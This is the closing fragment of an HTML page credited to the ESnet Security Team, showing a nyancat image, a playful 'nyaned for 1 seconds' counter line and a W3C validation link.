<p><img src="./imgs/nyancat.gif" alt="nyancat.gif" width="40%" style="background-blend-mode: multiply;background-color: #00075b;">
</p>
<p id="nyan">You have nyaned for 1 seconds!</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: ESnet Security Team</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
